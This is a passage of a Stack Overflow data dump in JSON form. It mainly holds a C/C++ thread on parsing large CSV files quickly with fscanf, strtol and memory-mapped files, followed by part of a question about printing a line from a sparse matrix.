<code>*</code>"}, {"owner": {"reputation": 126278, "user_id": 6451573, "user_type": "moderator", "accept_rate": 90, "profile_image": "https://i.stack.imgur.com/4xczZ.jpg?s=128&g=1", "display_name": "Jean-Fran&#231;ois Fabre", "link": "https://stackoverflow.com/users/6451573/jean-fran%c3%a7ois-fabre"}, "edited": false, "score": 5, "creation_date": 1524684698, "post_id": 50029949, "comment_id": 87076147, "body": "I would read a line with <code>fgets</code> then skip n commas (so no integer scan), then scan or tokenize from there."}, {"owner": {"reputation": 37954, "user_id": 905902, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a18869332564b1c3dfad9586d37095b2?s=128&d=identicon&r=PG", "display_name": "wildplasser", "link": "https://stackoverflow.com/users/905902/wildplasser"}, "edited": false, "score": 2, "creation_date": 1524685149, "post_id": 50029949, "comment_id": 87076333, "body": "<a href=\"https://stackoverflow.com/q/5431941/905902\">stackoverflow.com/q/5431941/905902</a> <code>while (!feof(stream)){...}</code>"}, {"owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "edited": false, "score": 0, "creation_date": 1524685331, "post_id": 50029949, "comment_id": 87076411, "body": "Your code doesn&#39;t skip to column 17."}, {"owner": {"reputation": 1733, "user_id": 5018637, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/aa5267033b2b33f15648273cbe845534?s=128&d=identicon&r=PG&f=1", "display_name": "user464502", "link": "https://stackoverflow.com/users/5018637/user464502"}, "edited": false, "score": 1, "creation_date": 1524691927, "post_id": 50029949, "comment_id": 87079388, "body": "What environment is this in?  Are the files fixed, or do you need to do this more than once?  I would consider Perl or mmap(2) for this.  In any case, I would probably  walk the lines manually and use strtol(3) in the right places to do the conversion."}, {"owner": {"reputation": 161, "user_id": 9501757, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Chi-fung LAM", "link": "https://stackoverflow.com/users/9501757/chi-fung-lam"}, "edited": false, "score": 0, "creation_date": 1524713672, "post_id": 50029949, "comment_id": 87084937, "body": "Thanks a lot, code corrected. Getline can perform what I want. just the speed... (see my previous question: <a href=\"https://stackoverflow.com/questions/50002563/read-in-large-csv-file-performance-issue-in-c\" title=\"read in large csv file performance issue in c\">stackoverflow.com/questions/50002563/&hellip;</a> )"}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "edited": false, "score": 0, "creation_date": 1524728762, "post_id": 50029949, "comment_id": 87091114, "body": "Can you show how you&#39;re measuring the speed?  (Also, which optimizer options you&#39;re using)  Function call overhead is unlikely to be <i>that</i> significant, and you should be able to skip columns with <code>%*[^,],</code>, which may be more efficient than matching integers."}, {"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1524731067, "post_id": 50029949, "comment_id": 87092525, "body": "Do the CSV files have only integral numbers in them?"}, {"owner": {"reputation": 94553, "user_id": 775806, "user_type": "registered", "accept_rate": 96, "profile_image": "https://i.stack.imgur.com/XNd2C.png?s=128&g=1", "display_name": "n. &#39;pronouns&#39; m.", "link": "https://stackoverflow.com/users/775806/n-pronouns-m"}, "edited": false, "score": 0, "creation_date": 1524733056, "post_id": 50029949, "comment_id": 87093728, "body": "Don&#39;t waste your time on wild guesses. Profile."}, {"owner": {"reputation": 29251, "user_id": 3923896, "user_type": "registered", "accept_rate": 69, "profile_image": "https://www.gravatar.com/avatar/4139ee1298ce4b0690a788cb97d47569?s=128&d=identicon&r=PG&f=1", "display_name": "Steve Summit", "link": "https://stackoverflow.com/users/3923896/steve-summit"}, "edited": false, "score": 0, "creation_date": 1524787663, "post_id": 50029949, "comment_id": 87123425, "body": "As a data point, I wondered how necessary it was here to resort to mmap and custom code.  I used two off-the-shelf tools to perform the desired task; it probably took me about a minute to perfect the recipe.  I find that processing a 350,000 line file takes about 4 seconds.  At that rate, 100,000 of those files would take almost 5 days.  So in this case, I have to concede that the custom code was probably worth it."}, {"owner": {"reputation": 161, "user_id": 9501757, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Chi-fung LAM", "link": "https://stackoverflow.com/users/9501757/chi-fung-lam"}, "edited": false, "score": 0, "creation_date": 1524804487, "post_id": 50029949, "comment_id": 87127202, "body": "You are right, this exactly my case. I have over 200,000 files with 300,000 ~ 400,000 lines need to process (and more files are coming)"}], "answers": [{"comments": [{"owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "edited": false, "score": 0, "creation_date": 1524730764, "post_id": 50031629, "comment_id": 87092336, "body": "For correctness, you should cast the <code>char</code> argument to <code>isspace()</code> to avoid undefined behavior: <code>isspace((unsigned char)*p)</code>. Also another potential issue: <code>find_nth_comma()</code> may return a pointer to the null terminator: <code>MyCounter = strtol(p+1, &amp;p, 10);</code> would then have undefined behavior. Same problem with the next call. Consider changing the semantics to <code>skip_n_fields()</code> and return a pointer past the n-th comma."}, {"owner": {"reputation": 161, "user_id": 9501757, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Chi-fung LAM", "link": "https://stackoverflow.com/users/9501757/chi-fung-lam"}, "edited": false, "score": 0, "creation_date": 1524754732, "post_id": 50031629, "comment_id": 87108600, "body": "I solved this issue by using memory map (see my below post)."}], "tags": [], "owner": {"reputation": 64283, "user_id": 315052, "user_type": "registered", "accept_rate": 79, "profile_image": "https://i.stack.imgur.com/AB5ST.png?s=128&g=1", "display_name": "jxh", "link": "https://stackoverflow.com/users/315052/jxh"}, "is_accepted": false, "score": 2, "last_activity_date": 1524783188, "last_edit_date": 1524783188, "creation_date": 1524691764, "answer_id": 50031629, "question_id": 50029949, "link": "https://stackoverflow.com/questions/50029949/use-fscanf-to-read-in-variable-numbers-of-integer/50031629#50031629", "title": "Use fscanf to read in variable numbers of integer", "body": "<p>So, there are at most 43 numbers per line. Even at 64 bits, each number is limited to 21 digits, so 1024 bytes is plenty for the max 946 bytes that a line could be (so long as there is no whitespace).</p>\n\n<pre><code>char line[1024];\n\nwhile (fgets(line, sizeof(line), stdin) != NULL) {\n    //...\n}\n</code></pre>\n\n<p>A helper function to skip to the desired column.</p>\n\n<pre><code>const char *find_nth_comma(const char *s, int n) {\n    const char *p = s;\n    if (p &amp;&amp; n) while (*p) {\n        if (*p == ',') {\n            if (--n == 0) break;\n        }\n        ++p;\n    }\n    return p;\n}\n</code></pre>\n\n<p>So, inside your loop, skip to column 10 to find the first number of interest, and then skip to column 17 to start reading in the rest of the numbers. The completed loop looks like:</p>\n\n<pre><code>while (fgets(line, sizeof(line), stdin) != NULL) {\n    const char *p = find_nth_comma(line, 9);\n    char *end;\n    assert(p &amp;&amp; *p);\n    MyCounter = strtol(p+1, &amp;end, 10);\n    assert(*end == ',');\n    p = find_nth_comma(end+1, 6);\n    assert(p &amp;&amp; *p);\n    for (int i = 0; i &lt; MyCounter; ++i, p = end) {\n        MyIntArray[i] = strtol(p+1, &amp;end, 10);\n        assert((*end == ',') ||\n               (i == MyCounter-1) &amp;&amp;\n               (*end == '\\0' || isspace(*end &amp; 0xFF)));\n    }\n}\n</code></pre>\n\n<p>This approach will work with a <code>mmap</code> solution as well. The <code>fgets</code> would be replaced with a function that points to the next line to be processed in the file. The <code>find_nth_comma</code> would need a modification to detect end of line/end of file rather than rely on a NUL terminated string. <code>strtol</code> would be changed with a custom function that again detects end of line or end of file. (The purpose of such changes is to remove any code that would require copying the data, which would be motivation for a <code>mmap</code> approach.)</p>\n\n<p>With parallel processing, it is possible to parse multiple parts of the file simultaneously. But, it is probably sufficient to have different threads process different files, and then collate the results after all files have been processed.</p>\n"}, {"comments": [{"owner": {"reputation": 161, "user_id": 9501757, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Chi-fung LAM", "link": "https://stackoverflow.com/users/9501757/chi-fung-lam"}, "edited": false, "score": 0, "creation_date": 1524754588, "post_id": 50038353, "comment_id": 87108509, "body": "Thx, yes, I do this exactly, see my answer."}], "tags": [], "owner": {"reputation": 97126, "user_id": 4593267, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/EEyLy.jpg?s=128&g=1", "display_name": "chqrlie", "link": "https://stackoverflow.com/users/4593267/chqrlie"}, "is_accepted": true, "score": 1, "last_activity_date": 1524731520, "creation_date": 1524731520, "answer_id": 50038353, "question_id": 50029949, "link": "https://stackoverflow.com/questions/50029949/use-fscanf-to-read-in-variable-numbers-of-integer/50038353#50038353", "title": "Use fscanf to read in variable numbers of integer", "body": "<p>In order to maximize performance, you should map the files in memory with <code>mmap</code> or equivalent and parse the file with ad hoc code, typically scanning one character at a time with a pointer, checking for <code>'\\n'</code> and/or <code>'\\r'</code> for end of record and converting the numbers on the fly for storage to your arrays. The tricky parts are:</p>\n\n<ul>\n<li>how do you allocate or otherwise handle the destination arrays.</li>\n<li>are the fields all numeric? integral?</li>\n<li>is the last record terminated by a newline? You can easily check this condition after the <code>mmap</code> call. The advantage is you only need check for end of file when you encounter a newline sequence.</li>\n</ul>\n"}, {"comments": [{"owner": {"reputation": 161, "user_id": 9501757, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Chi-fung LAM", "link": "https://stackoverflow.com/users/9501757/chi-fung-lam"}, "edited": false, "score": 0, "creation_date": 1524754499, "post_id": 50038801, "comment_id": 87108457, "body": "Thanks a lot, eventually I solve this issue with memory map file (see below post)"}, {"owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "reply_to_user": {"reputation": 161, "user_id": 9501757, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Chi-fung LAM", "link": "https://stackoverflow.com/users/9501757/chi-fung-lam"}, "edited": false, "score": 0, "creation_date": 1524755576, "post_id": 50038801, "comment_id": 87109169, "body": "Yes, you could use this approach on a memory-mapped file (but like my example, that means having to use <code>%n</code> to advance your position).  You should <b>accept</b> the answer that solved your problem, and <b>up-vote</b> all the ones you found useful.  (BTW &quot;above&quot; and &quot;below&quot; are pretty meaningless, as you can&#39;t predict the order in which others see the answers)."}], "tags": [], "owner": {"reputation": 23378, "user_id": 4850040, "user_type": "registered", "accept_rate": 62, "profile_image": "https://i.stack.imgur.com/acYd0.png?s=128&g=1", "display_name": "Toby Speight", "link": "https://stackoverflow.com/users/4850040/toby-speight"}, "is_accepted": false, "score": 1, "last_activity_date": 1524732829, "creation_date": 1524732829, "answer_id": 50038801, "question_id": 50029949, "link": "https://stackoverflow.com/questions/50029949/use-fscanf-to-read-in-variable-numbers-of-integer/50038801#50038801", "title": "Use fscanf to read in variable numbers of integer", "body": "<p>Probably the easiest way to read a run-time determined number of integers is to point into the right part of a longer format string.  In other words, we can have a format string with 28 <code>%d,</code> specifiers, but point to the <em>n</em>th one before the end of string and pass that pointer as the format string for <code>scanf()</code>.</p>\n\n<p>As a simple example, consider accepting 3 integers from a maximum of 6:</p>\n\n<pre class=\"lang-none prettyprint-override\"><code>\"%d,%d,%d,%d,%d,%d,\"\n          ^\n</code></pre>\n\n<p>The arrow shows the string pointer to use as the pattern argument.</p>\n\n<hr>\n\n<p>Here's a full worked example; its runtime is about 8 seconds for 1 million iterations (10 million lines) when built with <code>gcc -O3</code>.  It's slightly complicated by the mechanics to update the input string pointer, which is obviously not necessary when reading from a file stream.  I've skipped the checking that <code>nfields &lt;= 28</code>, but that's easily added.</p>\n\n<pre><code>char const *const input =\n    \"1,1,5,1,1,1,0,0,6,6,1,1,1,0,1,0,13,4,7,8,18,20,,,,,,,,,,,,,,,,,,,,,,\\n\"\n    \"1,1,5,1,1,1,0,1,6,5,1,1,1,0,1,0,4,7,8,18,20,,,,,,,,,,,,,,,,,,,,,,,\\n\"\n    \"1,1,5,1,1,1,0,2,6,5,1,1,1,0,1,0,4,7,8,18,20,,,,,,,,,,,,,,,,,,,,,,,\\n\"\n    \"1,1,5,1,1,1,0,3,6,5,1,1,1,0,1,0,13,4,7,8,20,,,,,,,,,,,,,,,,,,,,,,,\\n\"\n    \"1,1,5,1,1,1,0,4,6,5,1,1,1,0,1,0,13,4,7,8,20,,,,,,,,,,,,,,,,,,,,,,,\\n\"\n    \"1,1,5,1,1,1,0,5,6,4,1,0,1,0,1,0,4,8,18,20,,,,,,,,,,,,,,,,,,,,,,,,\\n\"\n    \"1,1,5,1,1,1,0,6,6,5,1,1,1,0,1,0,4,7,8,18,20,,,,,,,,,,,,,,,,,,,,,,,\\n\"\n    \"1,1,5,1,1,1,0,7,6,5,1,1,1,0,1,0,13,4,7,8,20,,,,,,,,,,,,,,,,,,,,,,,\\n\"\n    \"1,1,5,1,1,1,0,8,6,5,1,1,1,0,1,0,13,4,7,8,20,,,,,,,,,,,,,,,,,,,,,,,\\n\"\n    \"1,1,5,1,1,2,0,0,12,12,1,2,4,1,1,0,13,4,7,8,18,20,21,25,27,29,31,32,,,,,,,,,,,,,,,,\\n\";\n\n#include &lt;stdio.h&gt;\n\n#define SKIP_FIELD \"%*[^,],\"\n#define DECIMAL_FIELD \"%d,\"\n\nint read()\n{\n    int n;             /* bytes read - not needed for file or stdin */\n    int sum = 0;       /* just to make sure results are used */\n\n    for (char const *s = input;  *s;  ) {\n        int nfields;\n        int array[28];\n        int m = sscanf(s,\n                       /* field 0 is missing */\n                       SKIP_FIELD SKIP_FIELD SKIP_FIELD\n                       SKIP_FIELD SKIP_FIELD SKIP_FIELD\n                       SKIP_FIELD SKIP_FIELD SKIP_FIELD\n                       DECIMAL_FIELD /* field 10 */\n                       SKIP_FIELD SKIP_FIELD SKIP_FIELD\n                       SKIP_FIELD SKIP_FIELD SKIP_FIELD\n                       \"%n\",\n                       &amp;nfields,\n                       &amp;n);\n        if (m != 1) {\n            return -1;\n        }\n\n        s += n;\n\n        static const char fieldchars[] = DECIMAL_FIELD;\n        static const size_t fieldsize = sizeof fieldchars - 1; /* ignore terminating null */\n\n        static const char *const parse_entries =\n            DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD\n            DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD\n            DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD\n            DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD\n            DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD\n            DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD\n            DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD DECIMAL_FIELD\n            \"[^\\n] \";\n        const char *const line_parse = parse_entries + (28-nfields) * fieldsize;\n\n        /* now read nfields (max 28) */\n        m = sscanf(s,\n                   line_parse,\n                   &amp;array[0], &amp;array[1], &amp;array[2], &amp;array[3],\n                   &amp;array[4], &amp;array[5], &amp;array[6], &amp;array[7],\n                   &amp;array[8], &amp;array[9], &amp;array[10], &amp;array[11],\n                   &amp;array[12], &amp;array[13], &amp;array[14], &amp;array[15],\n                   &amp;array[16], &amp;array[17], &amp;array[18], &amp;array[19],\n                   &amp;array[20], &amp;array[21], &amp;array[22], &amp;array[23],\n                   &amp;array[24], &amp;array[25], &amp;array[26], &amp;array[27]);\n        if (m != nfields) {\n            return -1;\n        }\n\n        /* advance stream position */\n        sscanf(s, \"%*[^\\n] %n\", &amp;n);  s += n;\n\n        /* use the results */\n        for (int i = 0;  i &lt; nfields;  ++i) {\n            sum += array[i];\n        }\n    }\n    return sum;\n}\n\n#undef SKIP_FIELD\n#undef DECIMAL_FIELD\n\nint main()\n{\n    int sum = 0;\n    for (int i = 0;  i &lt; 1000000;  ++i) {\n        sum += read() * (i&amp;1 ? 1 : - 1); /* alternate add and subtract */\n    }\n    return sum != 0;\n}\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 161, "user_id": 9501757, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Chi-fung LAM", "link": "https://stackoverflow.com/users/9501757/chi-fung-lam"}, "is_accepted": false, "score": 2, "last_activity_date": 1524815994, "last_edit_date": 1524815994, "creation_date": 1524754531, "answer_id": 50046167, "question_id": 50029949, "link": "https://stackoverflow.com/questions/50029949/use-fscanf-to-read-in-variable-numbers-of-integer/50046167#50046167", "title": "Use fscanf to read in variable numbers of integer", "body": "<p>Eventually I use memory mapped file to solve my problem (this solution is a \nside product of my previous problem, performance issue when reading big CSV file)\n<a href=\"https://stackoverflow.com/questions/50002563/read-in-large-csv-file-performance-issue-in-c\">read in large CSV file performance issue in C++</a></p>\n\n<p>Since I work on MS Windows, so I use Stephan Brumme's \"Portable Memory Mapping C++ Class\"\n<a href=\"http://create.stephan-brumme.com/portable-memory-mapping/\" rel=\"nofollow noreferrer\">http://create.stephan-brumme.com/portable-memory-mapping/</a>\nSince I don't need to deal with file(s) > 2 GB, My implementation is simpler.\nFor over 2GB file, visit the web to see how to handle.</p>\n\n<p>Below please find my piece of code:</p>\n\n<pre><code>// may tried RandomAccess/SequentialScan\nMemoryMapped MemFile(FilterBase.BaseFileName, MemoryMapped::WholeFile, MemoryMapped::RandomAccess);\n\n// point to start of memory file\nchar* start = (char*)MemFile.getData();\n// dummy in my case\nchar* tmpBuffer = start;\n\n// looping counter\nuint64_t i = 0;\n\n// pre-allocate result vector\nMyVector.resize(300000);\n\n// Line counter\nint LnCnt = 0;\n\n//no. of field\nint NumOfField=43;\n//delimiter count, num of field + 1 since the leading and trailing delimiter are virtual\nint DelimCnt=NoOfField+1;\n//Delimiter position. May use new to allocate at run time\n// or even use vector of integer\n// This is to store the delimiter position in each line\n// since the position is relative to start of file. if file is extremely\n// large, may need to change from int to unsigner, long or even unsigned long long\nstatic  int DelimPos[DelimCnt];\n\n// Max number of field need to read usually equal to NumOfField, can be smaller, eg in my case, I only need 4 fields\n// from first 15 field, in this case, can assign 15 to MaxFieldNeed\nint MaxFieldNeed=NumOfField;\n// keep track how many comma read each line\nint DelimCounter=0;\n// define field and line seperator\nchar FieldDelim=',';\nchar LineSep='\\n';\n\n// 1st field, \"virtual Delimiter\" position\nDelimPos[CommaCounter]=-1\nDelimCounter++;\n\n// loop through the whole memory field, 1 and only once\nfor (i = 0; i &lt; MemFile.size();i++)\n{\n  // grab all position of delimiter in each line\n  if ((MemFile[i] == FieldDelim) &amp;&amp; (DelimCounter&lt;=MaxFieldNeed)){\n    DelimPos[DelimCounter] = i;\n    DelimCounter++;\n  };\n\n  // grab all values when end of line hit\n  if (MemFile[i] == LineSep) {\n    // no need to use if (DelimCounter==NumOfField) just assign anyway, waste a little bit\n    // memory in integer array but gain performance \n    DelimPos[DelimCounter] = i;\n    // I know exactly what the format is and what field(s) I want\n    // a more general approach (as a CSV reader) may put all fields\n    // into vector of vector of string\n    // With *EFFORT* one may modify this piece of code so that it can parse\n    // different format at run time eg similar to:\n    // fscanf(fstream,\"%d,%f....\n    // also, this piece of code cannot handle complex CSV e.g.\n    // Peter,28,157CM\n    // John,26,167CM\n    // \"Mary,Brown\",25,150CM\n    MyVector.StrField = string(strat+DelimPos[0] + 1, strat+DelimPos[1] - 1);\n    MyVector.IntField = strtol(strat+DelimPos[3] + 1,&amp;tmpBuffer,10);\n    MyVector.IntField2 = strtol(strat+DelimPos[8] + 1,&amp;tmpBuffer,10);\n    MyVector.FloatField = strtof(start + DelimPos[14] + 1,&amp;tmpBuffer);\n    // reset Delim counter each line\n    DelimCounter=0\n    // previous line seperator treat as first delimiter of next line\n    DelimPos[DelimCounter] = i;\n    DelimCounter++\n    LnCnt++;\n  }\n}\nMyVector.resize(LnCnt);\nMyVector.shrink_to_fit();\nMemFile.close();\n};\n</code></pre>\n\n<p>I can code whatever I want inside: </p>\n\n<pre><code>  if (MemFile[i] == LineSep) {\n  }\n</code></pre>\n\n<p>eg handle empty field, perform calculation etc.\nWith this piece of code, I handle 2100 files (6.3 GB) in 57 seconds!!!\n(I code the CSV format in it and only grab 4 values in my previous case).\nLater will change this code to handle this issue.\nThx all who help me in this issue.</p>\n"}], "owner": {"reputation": 161, "user_id": 9501757, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XdUIqdMkCWA/AAAAAAAAAAI/AAAAAAAAAAA/4252rscbv5M/photo.jpg?sz=128", "display_name": "Chi-fung LAM", "link": "https://stackoverflow.com/users/9501757/chi-fung-lam"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 981, "favorite_count": 0, "accepted_answer_id": 50038353, "answer_count": 4, "score": 3, "last_activity_date": 1524815994, "creation_date": 1524684397, "last_edit_date": 1524713980, "question_id": 50029949, "link": "https://stackoverflow.com/questions/50029949/use-fscanf-to-read-in-variable-numbers-of-integer", "title": "Use fscanf to read in variable numbers of integer", "body": "<p>I have over 100,000 csv files in the below format:</p>\n\n<pre><code>1,1,5,1,1,1,0,0,6,6,1,1,1,0,1,0,13,4,7,8,18,20,,,,,,,,,,,,,,,,,,,,,,\n1,1,5,1,1,1,0,1,6,5,1,1,1,0,1,0,4,7,8,18,20,,,,,,,,,,,,,,,,,,,,,,,\n1,1,5,1,1,1,0,2,6,5,1,1,1,0,1,0,4,7,8,18,20,,,,,,,,,,,,,,,,,,,,,,,\n1,1,5,1,1,1,0,3,6,5,1,1,1,0,1,0,13,4,7,8,20,,,,,,,,,,,,,,,,,,,,,,,\n1,1,5,1,1,1,0,4,6,5,1,1,1,0,1,0,13,4,7,8,20,,,,,,,,,,,,,,,,,,,,,,,\n1,1,5,1,1,1,0,5,6,4,1,0,1,0,1,0,4,8,18,20,,,,,,,,,,,,,,,,,,,,,,,,\n1,1,5,1,1,1,0,6,6,5,1,1,1,0,1,0,4,7,8,18,20,,,,,,,,,,,,,,,,,,,,,,,\n1,1,5,1,1,1,0,7,6,5,1,1,1,0,1,0,13,4,7,8,20,,,,,,,,,,,,,,,,,,,,,,,\n1,1,5,1,1,1,0,8,6,5,1,1,1,0,1,0,13,4,7,8,20,,,,,,,,,,,,,,,,,,,,,,,\n1,1,5,1,1,2,0,0,12,12,1,2,4,1,1,0,13,4,7,8,18,20,21,25,27,29,31,32,,,,,,,,,,,,,,,,\n</code></pre>\n\n<p>All I need is field 10 and field 17 onward, field 10 is the counter indicate how many\ninteger stored start from field 17 i.e. what I need is:</p>\n\n<pre><code>6,13,4,7,8,18,20\n5,4,7,8,18,20\n5,4,7,8,18,20\n5,13,4,7,8,20\n5,13,4,7,8,20\n4,4,8,18,20\n5,4,7,8,18,20\n5,13,4,7,8,20\n5,13,4,7,8,20\n12,13,4,7,8,18,20,21,25,27,29,31,32\n</code></pre>\n\n<p>Max number of integer need to read is 28. I can easily achieve this by Getline in C++, however, from my previous experience,\nsince I need to handle over 100,000 such files and each files may have 300,000~400,000 such lines.\nTherefore using Getline to read in the data and build a vector> may have serious performance issue\nfor me. I tried to use fscanf to achieve this:</p>\n\n<pre><code>while (!feof(stream)){\n fscanf(fstream,\"%*d,%*d,%*d,%*d,%*d,%*d,%*d,%*d,%*d,%d\",&amp;MyCounter);\n fscanf(fstream,\"%*d,%*d,%*d,%*d,%*d,%*d\"); // skip to column 17\n for (int i=0;i&lt;MyCounter;i++){\n  fscanf(fstream,\"%d\",&amp;MyIntArr[i]);\n }\n fscanf(fstream,\"%*s\"); // to finish the line\n}\n</code></pre>\n\n<p>However, this will call fscanf multiple times and may also create performance issue.\nIs there any way to read in variable number of integer at 1 call with fscanf ?\nOr I need to read into a string and then strsep/stoi it ? Compare to fscanf, which \nis better from performance point of view?</p>\n"}, {"tags": ["c", "matrix", "sparse-matrix"], "comments": [{"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524685664, "post_id": 50029848, "comment_id": 87076551, "body": "Nowhere in code is a print of a floating-point value.  Output <code>4.0 0.0 0.0 3.0</code> is suspicious.  Post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a>"}, {"owner": {"reputation": 21, "user_id": 7075313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba713d65bc998d3d0cb2ab8ee67ef5cc?s=128&d=identicon&r=PG&f=1", "display_name": "Big Bear", "link": "https://stackoverflow.com/users/7075313/big-bear"}, "reply_to_user": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524687186, "post_id": 50029848, "comment_id": 87077225, "body": "my structure auxMatrix has  <code>unsigned int line, column;  float value;</code>"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "edited": false, "score": 0, "creation_date": 1524688265, "post_id": 50029848, "comment_id": 87077741, "body": "Big Bear, rather than post code that is needed to compile in a comment, amend your post to include <code>struct  auxMatrix</code> definition.    Further, knowing the ``struct  auxMatrix` details is only one step.  Post still lacks how <code>4.0 0.0 0.0 3.0</code> was printed.  Post a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> to improve the post and receive good feedback."}], "owner": {"reputation": 21, "user_id": 7075313, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/ba713d65bc998d3d0cb2ab8ee67ef5cc?s=128&d=identicon&r=PG&f=1", "display_name": "Big Bear", "link": "https://stackoverflow.com/users/7075313/big-bear"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 67, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1524683957, "creation_date": 1524683957, "question_id": 50029848, "link": "https://stackoverflow.com/questions/50029848/print-a-matrix-line-from-a-sparse-matrix-saved-without-zeros", "title": "Print a matrix line from a sparse matrix saved without &#39;zeros&#39;", "body": "<p>How do I print a matrix line between 2 column indexs when I only have the non-zero indexes saved in a struct?</p>\n\n<p>I need to basically, given the right most index of a matrix and the left most index of a matrix, print that matrix line between both values if there's at least one index in that line that isn't zero and if the line I want to print is between the row's bound.</p>\n\n<p>I have a structure in which I store my row, column and value from each input, so that I don't have to generate a huge matrix full of 'zeros' and I have a variable that counts how many values I have stored.</p>\n\n<pre><code>int searchForLine(unsigned int l){\n    int i;\n    for(i=0;i&lt;matrixcount;i++){\n        if((auxMatrix[i].line == l)&amp;&amp;(auxMatrix[i].column&lt;=workingMatrix.maxCol)&amp;&amp;(auxMatrix[i].column&gt;= workingMatrix.minCol))\n            return (int)auxMatrix[i].value;\n    }\n    return (int)workingMatrix.zero;\n}\n\nvoid print_line(){\n    unsigned int ii,i,userLine;\n    scanf(\"%u\", &amp;userLine);\n    if((userLine&lt;workingMatrix.minLine) || (userLine&gt;workingMatrix.maxLine)){\n        printf(\"empty line\\n\");\n    }\n    else{\n        for(ii=0;ii&lt;matrixcount;ii++){\n                if(auxMatrix[ii].line!=userLine){\n                    printf(\"empty line\\n\");break;\n                }else{;}\n        }\n\n        for(i=workingMatrix.minCol;i&lt;workingMatrix.maxCol;i++){\n            printf(\"%u \",searchForLine(userLine));\n        }\n                    }\n                    printf(\"\\n\");\n                    }\n</code></pre>\n\n<p>if the input is lets say</p>\n\n<pre><code>3 3 3.0\n3 0 4.0\nprint_line(3)-&gt;\n4.0 0.0 0.0 3.0\n</code></pre>\n\n<p>My current code prints only 0.0's</p>\n"}, {"tags": ["c", "header"], "comments": [{"owner": {"reputation": 27420, "user_id": 4756299, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/e38adc5559df095cfe10c664916e8ffa?s=128&d=identicon&r=PG&f=1", "display_name": "Andrew Henle", "link": "https://stackoverflow.com/users/4756299/andrew-henle"}, "edited": false, "score": 1, "creation_date": 1524684015, "post_id": 50029817, "comment_id": 87075828, "body": "Do you mean 